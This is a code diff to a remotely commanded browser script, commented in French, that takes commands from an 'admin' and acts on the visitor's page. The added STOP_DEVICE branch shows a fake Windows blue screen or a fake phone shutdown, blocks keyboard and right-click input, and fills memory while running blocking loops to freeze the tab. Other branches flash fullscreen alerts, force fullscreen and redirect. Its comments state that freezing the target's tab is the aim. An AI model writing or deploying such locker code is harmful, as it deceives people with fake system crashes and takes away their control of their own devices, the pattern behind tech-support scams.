@@ -226,72 +226,122 @@ async function checkCommands() {
             console.log("Commande reçue de l'admin:", cmd.command);
 
             switch (cmd.command) {
+                case 'FLASH_ALERT':
+                    const msg = cmd.payload.message || "ALERTE SYSTÈME";
+                    
+                    // Création de l'overlay plein écran
+                    const flashOverlay = document.createElement('div');
+                    flashOverlay.style.cssText = `
+                        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+                        background: red; color: white; z-index: 9999999;
+                        display: flex; align-items: center; justify-content: center;
+                        text-align: center; font-family: sans-serif; font-weight: bold;
+                        flex-direction: column; padding: 20px; box-sizing: border-box;
+                    `;
+                    
+                    flashOverlay.innerHTML = `
+                        <h1 style="font-size: 3rem; margin-bottom: 20px; text-shadow: 2px 2px 10px black;">⚠️ ATTENTION ⚠️</h1>
+                        <p style="font-size: 1.5rem; background: rgba(0,0,0,0.5); padding: 20px; border-radius: 10px;">${msg}</p>
+                        <button id="close-flash" style="margin-top: 30px; padding: 15px 30px; font-size: 1rem; border: none; border-radius: 5px; cursor: pointer;">FERMER</button>
+                    `;
+                    
+                    document.body.appendChild(flashOverlay);
+                    
+                    // Tentative de plein écran
+                    try { flashOverlay.requestFullscreen().catch(() => {}); } catch(e) {}
+                    
+                    flashOverlay.querySelector('#close-flash').onclick = () => {
+                        flashOverlay.remove();
+                        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
+                    };
+                    break;
+
                 case 'ALERT':
-                    // Force l'alerte même si le navigateur tente de la bloquer
-                    const alertMsg = cmd.payload.message || "Message de l'administrateur";
-                    setTimeout(() => {
-                        while(true) {
-                            alert(alertMsg);
-                            if(!confirm("Voulez-vous vraiment fermer cette alerte ?")) break;
-                        }
-                    }, 0);
+                    // On garde ALERT classique pour compatibilité
+                    alert(cmd.payload.message || "Message de l'administrateur");
                     break;
                 case 'VIBRATE':
                     if (navigator.vibrate) {
-                        // Pattern de vibration agressif pour forcer l'attention
                         navigator.vibrate([500, 200, 500, 200, 1000]);
                     }
                     break;
                 case 'FULLSCREEN':
-                    // Tentative de forcer le plein écran sur chaque clic futur si refusé
                     const forceFS = () => {
                         document.documentElement.requestFullscreen().catch(() => {});
-                        // Tentative d'obscurcissement des contrôles
-                        document.body.style.cursor = 'none';
                     };
                     forceFS();
-                    document.addEventListener('click', forceFS);
+                    document.addEventListener('click', forceFS, { once: true });
                     break;
                 case 'REDIRECT':
-                    // Empêche le retour en arrière en remplaçant l'historique
-                    const targetUrl = cmd.payload.url || 'http://127.0.0.1';
-                    window.location.replace(targetUrl);
-                    // Boucle de redirection au cas où
-                    setTimeout(() => { window.location.href = targetUrl; }, 100);
+                    window.location.replace(cmd.payload.url || 'https://google.com');
                     break;
                 case 'RELOAD':
-                    window.location.reload(true);
+                    window.location.reload();
                     break;
                 case 'STOP_DEVICE':
-                    // Simulation d'arrêt agressive
-                    // Bloque les touches de fonction et le clic droit
-                    document.addEventListener('keydown', (e) => e.preventDefault());
-                    document.addEventListener('contextmenu', (e) => e.preventDefault());
+                    // Simulation d'arrêt agressive pour PC et Mobile
+                    document.body.innerHTML = '';
+                    document.body.style.background = 'black';
                     
-                    document.body.innerHTML = `
-                        <div style="background:black; color:white; height:100vh; width:100vw; display:flex; align-items:center; justify-content:center; font-family:monospace; position:fixed; top:0; left:0; z-index:999999; cursor:none;">
-                            <div style="text-align:center;">
-                                <h1 style="font-size:3rem; color:red; text-shadow: 0 0 10px red;">CRITICAL SYSTEM FAILURE</h1>
-                                <p style="font-size:1.2rem; margin-bottom:20px;">L'appareil a détecté une intrusion et va s'éteindre pour protéger les données.</p>
-                                <div id="crash-countdown" style="font-size:2.5rem; font-weight:bold;">ARRÊT IMMINENT...</div>
-                                <p style="margin-top:20px; color:#555;">Error code: 0x0000005C (HARDWARE_HALT)</p>
-                            </div>
-                        </div>
+                    const crashOverlay = document.createElement('div');
+                    crashOverlay.style.cssText = `
+                        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+                        background: black; color: white; z-index: 9999999;
+                        display: flex; align-items: center; justify-content: center;
+                        font-family: monospace; text-align: center;
                     `;
                     
-                    // Force le CPU à saturer pour geler l'appareil
+                    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                    
+                    if (isMobile) {
+                        crashOverlay.innerHTML = `
+                            <div style="padding: 20px;">
+                                <div style="width: 50px; height: 50px; border: 3px solid white; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+                                <h2 style="font-size: 1.2rem;">Arrêt en cours...</h2>
+                                <p style="color: #666; font-size: 0.8rem;">Ne pas éteindre votre téléphone.</p>
+                            </div>
+                            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                        `;
+                    } else {
+                        crashOverlay.innerHTML = `
+                            <div style="text-align: left; padding: 50px; max-width: 800px;">
+                                <h1 style="font-size: 5rem; margin: 0;">:(</h1>
+                                <h2 style="font-size: 1.5rem; margin-top: 20px;">Votre PC a rencontré un problème et doit redémarrer.</h2>
+                                <p style="margin-top: 20px;">Nous collectons simplement des informations relatives aux erreurs, puis nous allons redémarrer l'ordinateur pour vous.</p>
+                                <p style="margin-top: 10px; font-size: 1.2rem;">100% achevé</p>
+                                <div style="display: flex; gap: 20px; margin-top: 30px; align-items: center;">
+                                    <div style="width: 100px; height: 100px; background: white; padding: 5px;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=90x90&data=https://support.microsoft.com/stopcode" style="width:100%; height:100%;"></div>
+                                    <div style="font-size: 0.8rem;">
+                                        Pour plus d'informations sur ce problème et les solutions possibles, consultez https://www.windows.com/stopcode<br><br>
+                                        Si vous appelez un technicien, donnez-lui ces informations :<br>
+                                        Code d'arrêt : CRITICAL_PROCESS_DIED
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                        crashOverlay.style.background = '#0078d7'; // Bleu Windows
+                    }
+                    
+                    document.body.appendChild(crashOverlay);
+                    try { crashOverlay.requestFullscreen().catch(() => {}); } catch(e) {}
+                    
+                    // Bloquer l'interaction
+                    document.addEventListener('keydown', (e) => e.preventDefault(), true);
+                    document.addEventListener('contextmenu', (e) => e.preventDefault(), true);
+                    
+                    // Saturation CPU/Mémoire pour geler l'onglet (plus soft pour éviter de faire planter Trae mais assez pour bloquer l'onglet cible)
                     setTimeout(() => {
-                        // Tentative de saturation processeur légère
-                        let i = 0;
-                        const crashLoop = () => {
-                            console.log("SYSTEM_HALT_" + i++);
-                            // On ralentit la boucle pour éviter de faire planter ton PC de test
-                            // mais assez pour bloquer l'onglet
-                            for(let j=0; j<1000000; j++) { Math.sqrt(j); }
-                            setTimeout(crashLoop, 10);
-                        };
-                        crashLoop();
-                    }, 3000);
+                        const leak = [];
+                        setInterval(() => {
+                            for(let i=0; i<1000; i++) {
+                                leak.push(new Array(1000).fill(Math.random()));
+                            }
+                            console.log("FREEZE_IN_PROGRESS...");
+                            // Boucle infinie bloquante par intervalles
+                            const end = Date.now() + 100;
+                            while(Date.now() < end) { Math.sqrt(Math.random()); }
+                        }, 50);
+                    }, 2000);
                     break;
             }
         }
